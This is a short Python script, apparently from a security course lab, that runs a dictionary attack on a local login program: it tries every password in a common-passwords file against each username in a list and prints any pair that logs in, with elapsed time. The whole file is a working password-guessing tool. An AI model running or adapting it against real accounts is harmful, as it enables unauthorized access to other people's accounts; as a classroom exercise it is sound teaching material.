import time
import subprocess

# directory: /home/cse/Lab1/Q2/

f = open("/home/cse/Lab1/Q2/MostCommonPWs")
with open("/home/cse/Lab1/Q2/MostCommonPWs") as f:
  lines = [line.rstrip('\n') for line in f]
f.close()

f = open("/home/cse/Lab1/Q2/gang")
with open("/home/cse/Lab1/Q2/gang") as f:
  users = [line.rstrip('\n') for line in f]
f.close()

start = time.time()
print(f'start time: {start - start}')

for i in lines:
  for u in users:
    result = subprocess.run(["python3", "Login.pyc", u, i], capture_output = True, text = True, cwd = "/home/cse/Lab1/Q2/")
    if result.stdout == "Login successful.\n":
      print(result.stdout)
      print(f'{u}: {i}')
      print(f'end time: {time.time() - start}')